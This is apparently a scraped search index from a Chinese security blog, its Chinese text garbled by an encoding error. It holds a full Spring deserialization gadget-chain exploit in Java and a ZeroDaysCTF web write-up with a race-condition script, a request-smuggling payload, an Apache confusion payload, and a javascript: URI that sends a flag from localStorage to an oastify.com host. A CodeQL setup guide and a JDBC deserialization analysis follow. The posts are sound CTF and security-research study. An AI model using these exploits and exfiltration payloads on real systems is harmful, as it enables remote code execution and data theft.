java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Class c1 = Class.forName(com.sun.jndi.ldap.LdapAttribute); Class c2 = Class.forName(javax.naming.directory.BasicAttribute); Object ldap = createObjWithConstructor(c1,c2,new Class[]String.class,new Object[]6924bf); setField(ldap,rdn,new CompositeName(a//b)); setField(ldap,baseCtxURL,ldap://127.0.0.1:50389/); HashMapObject, Object hashMap = new HashMap(); hashMap.put(getObject, ldap); Class? c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap); ObjectFactory? objectFactory = (ObjectFactory?) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]ObjectFactory.class, invocationHandler); Class? clazz = Class.forName(org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler); Constructor? constructor2 = clazz.getDeclaredConstructors()[0]; constructor2.setAccessible(true); InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(objectFactory); Type type = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]Type.class, Attribute.class, invocationHandler2); HashMapObject, Object hashMap2 = new HashMap(); hashMap2.put(getType, type); InvocationHandler invocationHandler3 = (InvocationHandler) constructor.newInstance(Target.class, hashMap2); Class? typeProviderClass = Class.forName(org.springframework.core.SerializableTypeWrapper$TypeProvider); Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]typeProviderClass, invocationHandler3); Class? class2 = Class.forName(org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider); Constructor? constructor3 = class2.getDeclaredConstructors()[0]; constructor3.setAccessible(true); Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(toString), 0); setField(object, methodName, getAttributeDefinition); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); byte[] serializedBytes = byteArrayOutputStream.toByteArray(); String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(base64Encoded); byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes)); objectInputStream.readObject(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static T T createObjWithConstructor (ClassT clazz,Class? super T superClazz,Class?[] argsTypes,Object[] argsValues) throws Exception Constructor?super T constructor = superClazz.getDeclaredConstructor(argsTypes); constructor.setAccessible(true); Constructor? constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance(argsValues); è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ ç„¶ååé¢è¿›è¡Œä¸€ä¸ªè°ƒè¯•ï¼Œå‘ç°å…¶å®è¿›è¡Œäº†ä¸€ä¸ªè¿œç¨‹ç±»åŠ è½½çš„ç›¸å…³ä»£ç å¹¶ä¸æ˜¯getAttributeDefinition()æ–¹æ³•ä¸­æœ€æ˜æ˜¾çš„lookupå‡½æ•° è¿™è¾¹ç¬”è€…å°±ä¸è¿›è¡Œè°ƒè¯•äº†ï¼Œæƒ³è°ƒè¯•çš„å¯ä»¥è‡ªå·±å»è¯•è¯•ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š c_lookup:1085, LdapCtx (com.sun.jndi.ldap)c_resolveIntermediate_nns:168, ComponentContext (com.sun.jndi.toolkit.ctx)c_resolveIntermediate_nns:359, AtomicContext (com.sun.jndi.toolkit.ctx)p_resolveIntermediate:439, ComponentContext (com.sun.jndi.toolkit.ctx)p_getSchema:432, ComponentDirContext (com.sun.jndi.toolkit.ctx)getSchema:422, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)getSchema:210, InitialDirContext (javax.naming.directory)getAttributeDefinition:207, LdapAttribute (com.sun.jndi.ldap)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler (org.springframework.beans.factory.support)getAttributeDefinition:-1, $Proxy1 (com.sun.proxy)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeMethod:202, ReflectionUtils (org.springframework.util)invokeMethod:187, ReflectionUtils (org.springframework.util)readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeReadObject:1058, ObjectStreamClass (java.io)readSerialData:1900, ObjectInputStream (java.io)readOrdinaryObject:1801, ObjectInputStream (java.io)readObject0:1351, ObjectInputStream (java.io)readObject:371, ObjectInputStream (java.io)main:66, Main (org.example) æ€»ç»“spring1å’Œspring2çš„é“¾å­éƒ½ä¸åŠ¨æ€ä»£ç†å¯†åˆ‡ç›¸å…³ï¼Œå»ºè®®æ˜¯å…ˆç†Ÿç»ƒæŒæ¡äº†åŠ¨æ€ä»£ç†ä¹‹åå†æ¥å­¦ä¹ è¿™ä¸¤æ¡é“¾å­ä¼šæ¯”è¾ƒè½»æ¾ å¯¹äºè¿™ä¸¤æ¡é“¾çš„åˆ©ç”¨è‚¯å®šä¸æ­¢ç¬”è€…è¿™é‡Œæåˆ°çš„è¿™äº›ï¼Œå¤§å®¶æœ‰å…´è¶£çš„ä¹Ÿå¯ä»¥è‡ªå·±å»æ‰¾æ‰¾çœ‹","categories":["javaååºåˆ—åŒ–"]},{"title":"ZeroDaysCTF-webé¢˜è§£","path":"/2025/04/20/ZeroDaysCTF-webé¢˜è§£/","content":"å‰è¨€è¯¥æ¯”èµ›ç¬”è€…å¹¶æœªå‚åŠ ï¼Œåªæ˜¯èµ›åé»˜é»˜è‡ªå·±å¤ç°ç€åš æ„Ÿè°¢æ¯”èµ›æ–¹ä¼Ÿå¤§çš„å¼€æºï¼šhttps://github.com/ZeroDaysCTF/ZeroDaysCTF_2025_Public JohnAndMarysæœ€ä¸»è¦çš„æ–‡ä»¶ä¾¿æ˜¯app.pyï¼Œé‡Œé¢ç€é‡çœ‹ä¸‹é¢è¿™ä¸ªå‡½æ•° @app.route(/order, methods=[GET,POST])def order(): if request.method != POST: return redirect(/) sess_id = session.get(session_id) whiskey_limit = session_data[sess_id].get(whiskey_limit) time.sleep(1) order = request.json order[quantity] = int(order[quantity]) if order[quantity]1: return Order fail - quantity must be greater than zero if order[item] not in [whiskey, candles, tea]: return Order fail - invalid item, we dont stock that! if order[item] == whiskey: if order[quantity] = whiskey_limit: session_data[sess_id][whiskey_limit] = whiskey_limit - order[quantity] else: return Order fail - over whiskey limit session_data[sess_id][orders].append((order[item], order[quantity])) return fOrder placed successfully: order[item] x order[quantity] è¯¥å‡½æ•°ä¸»è¦å°±æ˜¯ä»sessionä¸­è·å–åˆ°å¨å£«å¿Œè¿˜èƒ½ä¹°çš„æ•°é‡åå†è¿›è¡Œè´­ä¹° ä»£ç ä¸­è®¾å®šäº†é¡¶å¤šåªèƒ½ä¹°ä¸¤ç“¶ ä½†æ˜¯ä»ä¸‹é¢ä»£ç ä¸­å›½æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¦æƒ³è·å–åˆ°flagï¼Œé‚£ä¹ˆå¨å£«å¿Œè´­ä¹°æ•°é‡å¿…é¡»è¦å¤§äºä¸¤ç“¶æ‰å¯ä»¥ @app.route(/order-list)def orderlist(): flagval = No flag yet, not enough drink ordered sess_id = session.get(session_id) orders = session_data[sess_id][orders] drink_count = 0 for order in orders: item,quantity = order if item == whiskey: drink_count+=quantity if drink_count 2: flagval = flag return render_template(orderlist.html, orders=orders, whiskey_limit=session_data[sess_id][whiskey_limit], flag=flagval) å›å¤´å†ç ”ç©¶ä¸€ä¸‹order()å‡½æ•°ï¼Œå‘ç°ä¸€è¡Œä»£ç å¾ˆå¥‡æ€ªï¼štime.sleep(1) æ— ç¼˜æ— æ•…çš„ï¼Œè¿™æ ·æä¸å°±å¯ä»¥ç”¨ä¸Šæ¡ä»¶ç«äº‰äº†å˜› è„šæœ¬å¦‚ä¸‹ï¼š import requestsimport threadingfrom threading import Threadhost = http://127.0.0.1:9876# è·å– cookieresponse = requests.head(host)cookie = response.headers.get(Set-Cookie).split(;)[0]print(cookie)# å‘é€è®¢å•çš„å‡½æ•°def send_order(): headers = Content-Type: application/json, Cookie: cookie data = item: whiskey, quantity: 1 requests.post(fhost/order, headers=headers, json=data)# åˆ›å»ºå¹¶å¯åŠ¨å¤šä¸ªçº¿ç¨‹å‘é€è®¢å•threads = []for _ in range(4): t = Thread(target=send_order) t.start() threads.append(t)# ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆfor t in threads: t.join()# è·å–è®¢å•åˆ—è¡¨å¹¶æ£€æŸ¥ Flagresponse = requests.get(fhost/order-list, headers=Cookie: cookie)if Flag in response.text: print(Found Flag in response:) print(response.text)else: print(No Flag found in response) æˆåŠŸæ‹¿åˆ°flag Familiar Facesé¦–å…ˆæˆ‘ä»¬çœ‹åˆ°æœ‰å†™ä¸€ä¸ªbotï¼Œä¼šæ¯éš”60ç§’å°±æŠŠfalgä¼ åˆ°sessioné‡Œé¢ï¼Œå‚æ•°åæ˜¯secret ç„¶åå†çœ‹index.php æœ‰ä¸€æ®µä»£ç æ˜¯ä¼šæ‰“å°å‡ºä½ sessionä¸­çš„secretå€¼ å½“ç„¶ä¸Šé¢æœ‰æ®µä»£ç æ˜¯å†™è¿›secretå€¼çš„ å†å¾€ä¸‹å®¡è®¡ï¼Œç›´æ¥å°†getä¼ å‚çš„å€¼è¿›è¡Œäº†æ‹¼æ¥ï¼Œæ²¡æœ‰ä»»ä½•çš„æ£€æµ‹ ç„¶åå†å¯¹$countyPathç›®å½•ä¸‹é¢çš„æ–‡ä»¶è¿›è¡Œéå† é‚£æˆ‘ä»¬å°±ç›®å½•ç©¿è¶Šï¼ŒapacheæœåŠ¡ä¸‹é¢sessionæ–‡ä»¶é»˜è®¤æ˜¯åœ¨tmpç›®å½•ä¸‹é¢ å‘ç°sessionæ–‡ä»¶å†…å®¹éƒ½æ²¡æ‰“å°å‡ºæ¥ï¼Œåªæœ‰sessionæ–‡ä»¶å å½“æ—¶å¡äº†ä¸€ä¼šï¼Œç»æœ‹å‹æé†’æ‰æƒ³èµ·æ¥sessionæ–‡ä»¶åçš„sess_åé¢çš„éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬çš„cookieå€¼ è¿›è¡Œæ›´æ”¹ï¼ŒæˆåŠŸæ‰“å°å‡ºflag spinmasterè¿™é¢˜é¢˜è§£è¯´æ˜¯0day /?method=POST%20/flag%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%209%0d%0a%0d%0agive=flag ApacheCultureNightapachehttpdç‰ˆæœ¬è¦ä½äº2.4.60 è¯¥é¢˜æ‰€æ¶‰åŠåˆ°çš„æ¼æ´åŠå…¶åˆ©ç”¨éƒ½ä½äºè¯¥ç¯‡æ–‡ç« ä¸­ï¼šhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/ ä»æ–‡ç« ä¸­æˆ‘ä»¬å¯ä»¥äº†è§£åˆ°è¯¥é¢˜ç”¨åˆ°çš„æ˜¯æ–‡ä»¶åæ··æ·†æ”»å‡»ï¼Œé€šè¿‡apacheå†…éƒ¨å„ä¸ªæ¨¡å—ä¹‹é—´çš„äº¤æµæ²Ÿé€šæœ‰ä¸€å®šé—®é¢˜çš„æƒ…å†µä¸‹è¿›è¡Œçš„æ”»å‡» æ–‡ç« ä¸­æåˆ°çš„mod_rewirteï¼Œæˆ‘ä»¬åœ¨çœ‹httpd.confæ–‡ä»¶æ—¶åœ¨å…¶æœ«å°¾æœ‰å†™åˆ° mod_rewrite å¼ºåˆ¶å°†æ‰€æœ‰é‡å†™çš„ç»“æœè§†ä¸º URLï¼Œå› æ­¤å³ä½¿ç›®æ ‡æ˜¯æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œä¹Ÿå¯ä»¥åœ¨é—®å·å¤„æˆªæ–­ åˆ©ç”¨é—®å·è¿›è¡Œæˆªæ–­æ¥è®¿é—®åŸæœ¬è®¿é—®ä¸åˆ°çš„æ–‡ä»¶ï¼Œé¢˜ç›®ä»…å¼€æ”¾äº†filesç›®å½•ä¸‹é¢çš„è®¿é—®æƒé™ï¼Œè€Œæˆ‘ä»¬çš„flag.txtæ–‡ä»¶ä¹Ÿæ°å¥½åœ¨è¯¥ç›®å½•ä¸‹é¢ æ‰€ä»¥æˆ‘ä»¬çš„payloadå¦‚ä¸‹ curl http://172.17.0.2/flag.txt%3flol.png quote-of-the-dayæ­èµ·æ¥çš„dockerå®¹å™¨ï¼Œé¢˜ç›®é‡Œé¢çš„å„ä¸ªæŒ‰é’®åŠŸèƒ½å…ˆè‡ªå·±æµ‹è¯•ä¸€é çœ‹app.pyæ–‡ä»¶ï¼Œé‡ç‚¹å…³æ³¨ä¸‹é¢è¿™æ®µä»£ç  @app.route(/api/report, methods=[POST])def report(): url = request.json.get(url) r = requests.post(http://bot:3000/visit, json=url: url) if r.status_code == 200: return jsonify(status: success) return jsonify(status: failure) å‘ç°æ˜¯ç»™botå‘äº†ä¸€ä¸ªè¯·æ±‚ é‚£æˆ‘ä»¬å°±å»çœ‹çœ‹è·Ÿbotæœ‰å…³çš„ä»£ç æ–‡ä»¶â€”â€”app.jsï¼Œflagä½ç½®ï¼šconst FLAG = process.env.FLAG || ZeroDaysfake_flag; ä¸‹é¢æœ‰å®šä¹‰ä¸€ä¸ªPOSTçš„visitè·¯ç”±ï¼Œæ¥æ”¶ä¸€ä¸ªåŒ…å«urlçš„JSONè¯·æ±‚ä½“ åœ¨page.evaluateOnNewDocumentä¸­ï¼Œå°†FLAGå†™å…¥localStorageçš„sessioné¡¹ã€‚è¿™ä¸€æ­¥å¯èƒ½æ˜¯åœ¨é¡µé¢åŠ è½½ä¹‹å‰æ³¨å…¥ä¸€äº›æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯æˆ–è€…flagæœ¬èº«ã€‚ç„¶åè®¿é—®http://web:5000/ï¼Œå¹¶å†æ¬¡åœ¨é¡µé¢ä¸Šä¸‹æ–‡ä¸­å°†FLAGå†™å…¥localStorageçš„FLAGé¡¹ åœ¨è¿™ä¹‹åï¼Œä¼šå†æ¬¡å¯¼èˆªåˆ°æˆ‘ä»¬ä¼ è¿‡å»çš„url æ²¡æœ‰å¯¹æˆ‘ä»¬ä¼ çš„urlè¿›è¡Œä»»ä½•çš„æ£€æµ‹ï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„url æ€»ç»“ä¸€ä¸‹visitè·¯ç”±ç›¸å…³ä»£ç é€»è¾‘ï¼Œæµç¨‹æ˜¯ï¼š åˆ›å»ºæ–°é¡µé¢ã€‚ åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥localStorageçš„sessioné¡¹ã€‚ å¯¼èˆªåˆ°web:5000ï¼Œå¹¶å†æ¬¡è®¾ç½®FLAGåˆ°localStorageã€‚ ç„¶åå¯¼èˆªåˆ°ç”¨æˆ·æä¾›çš„urlã€‚ ç­‰å¾…3ç§’åå…³é—­é¡µé¢ã€‚ æˆ‘ä»¬ä¼ è¿‡å»çš„å¦‚æœæ˜¯javascript: URIçš„è¯ï¼Œæ‰§è¡Œçš„ç¯å¢ƒæ˜¯å½“å‰é¡µé¢çš„æºï¼Œä¹Ÿå°±æ˜¯web:5000ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®è¯¥æºçš„localStorageã€‚å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…æäº¤çš„urlæ˜¯javascript:â€¦è¿™æ ·çš„ä»£ç ï¼Œé‚£ä¹ˆå½“é¡µé¢å¯¼èˆªåˆ°è¯¥URLæ—¶ï¼Œä¼šæ‰§è¡Œè¯¥è„šæœ¬ï¼Œæ­¤æ—¶å°±å¯ä»¥è¯»å–localStorageä¸­çš„FLAGï¼Œå¹¶å°†å…¶å¤–æ³„ payloadï¼š javascript:fetch(http://nja4ij5myfi8rnuavztvkob4vv1mpcd1.oastify.com?flag= + encodeURIComponent(localStorage.FLAG)) å¤–å¸¦æˆåŠŸ","categories":["Write-Up"]},{"title":"å·¥å…·codeqlçš„å­¦ä¹ ä¹‹è·¯","path":"/2025/04/18/å·¥å…·codeqlçš„å­¦ä¹ ä¹‹è·¯/","content":"å¼•ç”¨https://blog.hackpax.top/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E7%AF%8702-codeql/ CodeQLæ¦‚å¿µCodeQLæ˜¯ä¸€ä¸ªå…è´¹å¼€æºçš„ä»£ç è¯­ä¹‰åˆ†æå¼•æ“ï¼Œå…¶åˆ©ç”¨QLè¯­è¨€å¯¹ä»£ç ã€æ‰§è¡Œæµç¨‹ç­‰è¿›è¡Œâ€œæŸ¥è¯¢â€ï¼Œä»¥æ­¤å®ç°å¯¹ä»£ç çš„å®‰å…¨æ€§ç™½ç›’å®¡è®¡ï¼Œè¿›è¡Œæ¼æ´æŒ–æ˜ã€‚ ç®€å•æ¥è¯´ï¼ŒCodeQLæ˜¯ä¸€ä¸ªæŠŠéœ€è¦å®¡è®¡çš„é¡¹ç›®å…ˆè½¬åŒ–æˆç±»ä¼¼æ•°æ®åº“çš„å½¢å¼ï¼Œå¹¶åŸºäºè¯¥databaseè¿›è¡Œåˆ†æçš„å·¥å…·ã€‚ æ­å»º1.ä¸‹è½½CodeQLå¼•æ“https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip å…ˆæŠŠè¯¥å¼•æ“é…åˆ°ç¯å¢ƒå˜é‡ï¼Œæ–¹ä¾¿æ‰§è¡ŒCodeQLè¯­å¥ã€‚CodeQLé…ç½®ç¯å¢ƒå˜é‡åªè¦æŠŠå…¶æ ¹ç›®å½•é…è¿›å»å°±å®Œäº‹äº†ï¼Œç»“æœå¦‚ä¸‹å³å¯ï¼š 2.ä¸‹è½½SDKï¼šhttps://codeload.github.com/github/codeql/zip/refs/heads/main æˆ‘ä»¬ä¹‹åè¦åœ¨è¯¥SDKä¸‹é¢å†™qlè¯­å¥å¹¶æ‰§è¡Œã€‚ 3.vscodeä¸‹è½½CodeQLæ’ä»¶ï¼šç„¶åä¼šåœ¨vscodeå·¦è¾¹çš„ä¾§è¾¹æ å‘ç°â€QLâ€å›¾æ ‡ï¼Œå³æ˜¯CodeQLå›¾æ ‡ã€‚ æ‰“å¼€è®¾ç½®ï¼ŒæŠŠCodeQLå¼•æ“çš„è·¯å¾„å†™ä¸Šå»ï¼š 4.Mavené¡¹ç›®å»ºåº“é¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨æœ¬æœºä¸Šå®‰è£…ä¸€ä¸‹mavenï¼šDownload Apache Maven â€“ Maven ç„¶åå†é…ä¸€ä¸‹ç¯å¢ƒå˜é‡ å½“å®¡è®¡mavené¡¹ç›®çš„æ—¶å€™ æ‰“å¼€Mavené¡¹ç›®ï¼ŒæŠŠé¡¹ç›®æ„å»ºå¥½ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦æ·»åŠ ä¸€ä¸ªæ’ä»¶ï¼Œæœ¬äººæ˜¯å…ˆä¸‹å¯¹åº”ä¾èµ–å†æ·»åŠ ï¼š dependency groupIdorg.apache.maven.plugins/groupId artifactIdmaven-war-plugin/artifactId version3.4.0/version/dependencyplugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-war-plugin/artifactId version3.4.0/version /plugin ç„¶åå…ˆæ‰§è¡Œï¼š mvn clean install --file=pom.xml æˆåŠŸæ„å»ºäº†ï¼Œå†æ‰§è¡Œï¼š codeql databse create name_1 --language=java --source-root path_1 path_1æ˜¯å½“å‰éœ€è¦å®¡è®¡çš„é¡¹ç›®è·¯å¾„ï¼Œname_1æ˜¯CodeQLå°†è¦å»ºç«‹æ•°æ®åº“çš„åç§° 5.vscodeæ‰§è¡ŒæŸ¥è¯¢ä»¥ä¸‹æ“ä½œéƒ½åœ¨vscodeæ‰§è¡Œï¼Œå…ˆæ‰“å¼€CodeQLé€‰é¡¹å¡ã€‚ å…ˆæŠŠSDKç›®å½•æ”¾å…¥ä¸‹å›¾ï¼Œå¹¶æ”¾å…¥å·¥ä½œåŒºï¼š ç„¶åæ·»åŠ æ•°æ®åº“ï¼Œæˆ‘çš„name_1ä½ç½®çš„å‚æ•°ï¼ˆç”Ÿæˆçš„æ•°æ®åº“åï¼‰å‘½åä¸ºcodeql ç„¶ååœ¨å·¥ä½œåŒºæ‰¾åˆ°SDKï¼ˆç¬¬ä¸€ä¸ªï¼Œcodeql-mainï¼‰ï¼š åœ¨codeql-mainæ‰“å¼€è·¯å¾„javaqlsrcï¼Œå†™ä¸€ä¸ªdemo.qlï¼š import java from Method methodwhere method.hasName(getValue)select method.getName(), method.getDeclaringType() ç¡®ä¿Javaåº“æ­£ç¡®å¯¼å…¥ ç„¶åè¿è¡Œï¼š è‡³æ­¤ï¼ŒCodeQLçš„æ„å»ºå°±å®Œæˆäº†ï¼Œä¹‹åå°±æ˜¯å­¦ä¹ è¯­æ³•ï¼Œä¸æ–­å®è·µäº†ã€‚","categories":["å·¥å…·"]},{"title":"javaååºåˆ—åŒ–ä¹‹JDBC","path":"/2025/04/06/javaååºåˆ—åŒ–ä¹‹JDBC/","content":"å¼•ç”¨WebDogå¿…å­¦çš„JDBCååºåˆ—åŒ– JDBCååºåˆ—åŒ–æ¼æ´åˆ†æ å°ç™½çœ‹å¾—æ‡‚çš„MySQL JDBC ååºåˆ—åŒ–æ¼æ´åˆ†æ Javaå®‰å…¨ä¹‹JDBC Attackså­¦ä¹ è®°å½• JDBCç®€ä»‹BCï¼ˆJava DataBase Connectivityï¼‰æ˜¯ä¸€ç§ç”¨äºæ‰§è¡ŒSqlè¯­å¥çš„Java Apiï¼Œå³Javaæ•°æ®åº“è¿æ¥ï¼Œæ˜¯Javaè¯­è¨€ä¸­ç”¨æ¥è§„èŒƒå®¢æˆ·ç«¯ç¨‹åºå¦‚ä½•æ¥è®¿é—®æ•°æ®åº“çš„åº”ç”¨ç¨‹åºæ¥å£ï¼Œå¯ä»¥ä¸ºå¤šç§å…³ç³»æ•°æ®åº“æä¾›ç»Ÿä¸€è®¿é—®ï¼Œæä¾›äº†è¯¸å¦‚æŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“ä¸­æ•°æ®çš„æ–¹æ³•ï¼Œæ˜¯Javaè®¿é—®æ•°æ®åº“çš„æ ‡å‡†è§„èŒƒã€‚ç®€å•ç†è§£ä¸ºé“¾æ¥æ•°æ®åº“ã€å¯¹æ•°æ®åº“æ“ä½œéƒ½éœ€è¦é€šè¿‡jdbcæ¥å®ç° åŸç†åˆ†æç®€å•demoé¦–å…ˆæˆ‘ä»¬å…ˆåœ¨mavenå¼•å…¥ä¾èµ– dependencygroupIdmysql/groupIdartifactIdmysql-connector-java/artifactIdversion8.0.19/version/dependency æˆ‘ä»¬è¯•ç€ç”¨jdbcæ¥æŸ¥è¯¢ä¸€ä¸‹æˆ‘ä»¬è‡ªå·±æœ¬æœºä¸Šçš„è¡¨ package org.example;import java.sql.*;//å¯¼å…¥APIæ‰€éœ€åŒ…public class Main public static void main(String[] args) throws ClassNotFoundException, SQLException //JDBCé©±åŠ¨ç¨‹åº String driver = com.mysql.cj.jdbc.Driver; //String Driver = com.mysql.jdbc.Driver; // mysql-connector-java 5//æ•°æ®åº“è¿æ¥URLä»¥åŠç›¸å…³é…ç½® String url = jdbc:mysql://127.0.0.1:3306/admin?serverTimezone=UTCautoDeserialize=truestatementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor;//åŠ è½½é©±åŠ¨ç±» Class.forName(driver);//é€šè¿‡ Drivermanager ç±»è·å–æ•°æ®åº“è¿æ¥çš„å®ä¾‹ Connection connection = DriverManager.getConnection(url,root,123456);//åˆ©ç”¨createStatementæ¥å£è·å–ä¸€ä¸ªstatementå¯¹è±¡ï¼Œç”¨äºæ‰§è¡Œsqlè¯­å¥ Statement statement = connection.createStatement();//æ‰§è¡Œsqlè¯­å¥ï¼Œå°†ç»“æœä¿å­˜åœ¨ResultSetå¯¹è±¡ä¸­ ResultSet resultSet = statement.executeQuery(SELECT * FROM users);//å°†ç»“æœé›†è¾“å‡ºå‡ºæ¥ while (resultSet.next()) String username = resultSet.getString(name); String password = resultSet.getString(age); System.out.println( username:+username+ password:+password); // System.out.println(connection); è¯´ä¸€ä¸‹æ•°æ®åº“è¿æ¥çš„ä¸€äº›é…ç½®å§ adminå°±æ˜¯æ‰€éœ€è¦è¿æ¥çš„æ•°æ®åº“åç§° serverTimezoneUTC æŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„æ—¶åŒºä¸ºåè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼‰æ²¡æœ‰æ­£ç¡®çš„æ—¶é—´å¤„ç†ï¼Œè¿è¡Œæ˜¯ä¼šæŠ¥é”™çš„ autoDeserializetrue è¡¨æ˜ä»æ•°æ®åº“ä¸­æ£€ç´¢æ•°æ®ä¼šè‡ªåŠ¨ååºåˆ—åŒ–ï¼Œè¿™ä¸ªè®¾ç½®å¾ˆé‡è¦ï¼Œè®¾ç½®ä¸ºfalseå°±æ²¡æ³•åˆ©ç”¨äº† statementInterceptorscom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor æŒ‡å®šäº†ä¸€ä¸ªMysqlçš„è¯­å¥æ‹¦æˆªå™¨ï¼Œç”¨äºåœ¨æ‰§è¡Œsqlè¯­å¥å‰å¤„ç†ç‰¹æ®Šäº‹ä»¶ æŸ¥è¯¢ç»“æœå¦‚ä¸‹ javaåºåˆ—åŒ–å¯¹è±¡ç‰¹å¾æˆ‘ä»¬ä¹Ÿç®€å•å†™ä¸€ä¸ªdemo package org.example;import java.io.*;public class Car implements Serializable private String name; public Car() this.name =car; public static void main(String[] args) throws IOException, FileNotFoundException Car car=new Car(); FileOutputStream fos =new FileOutputStream(output); ObjectOutputStream oos =new ObjectOutputStream(fos); oos.writeObject(car); oos.close(); è¾“å‡ºoutputæ–‡ä»¶åï¼Œå†ç”¨ä¸“é—¨çš„è½¯ä»¶è¿›è¡ŒæŸ¥çœ‹è¯¥16è¿›åˆ¶æ–‡ä»¶ å¯ä»¥çœ‹å‡ºæ¥åºåˆ—åŒ–æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚å›ºå®šä¸º-84å’Œ-19ï¼Œè¿™ä¸€ç‚¹åœ¨åé¢æœ‰é‡å¤§ä½œç”¨ readObjectè§¦å‘ç‚¹è¿™æ¬¡å°±ä¸è·Ÿç€èµ°ä¸€éæµç¨‹äº†ï¼Œç›´æ¥è¯´é‡ç‚¹ï¼Œæ¼æ´ç‚¹åœ¨äºcom.mysql.cj.jdbc.result.ResultSetImpl.getObject() public Object getObject(int columnIndex) throws SQLException checkRowPos(); checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; // we cant completely rely on code below because primitives have default values for null (e.g. int-0) if (this.thisRow.getNull(columnIndexMinusOne)) return null; Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) case BIT: // TODO Field sets binary and blob flags if the length of BIT field is 1; is it needed at all? if (field.isBinary() || field.isBlob()) byte[] data = getBytes(columnIndex); if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) Object obj = data; if ((data != null) (data.length = 2)) if ((data[0] == -84) (data[1] == -19)) // Serialized object? try ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); catch (ClassNotFoundException cnfe) throw SQLError.createSQLException(Messages.getString(ResultSet.Class_not_found___91) + cnfe.toString() + Messages.getString(ResultSet._while_reading_serialized_object_92), getExceptionInterceptor()); catch (IOException ex) obj = data; // not serialized? else return getString(columnIndex); return obj; return data; return field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex); ...... å…³é”®ç‚¹å¦‚ä¸‹ï¼š åœ¨è¿›å…¥ååºåˆ—åŒ–ä¹‹å‰å…ˆè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­if ((data[0] == -84) (data[1] == -19)) æ˜¯ä¸æ˜¯ç‰¹åˆ«çš„ç†Ÿæ‚‰ï¼Œå°±æ˜¯ä¸Šé¢ç€é‡æåˆ°çš„é‚£ä¸¤ä¸ªæ•°å­— 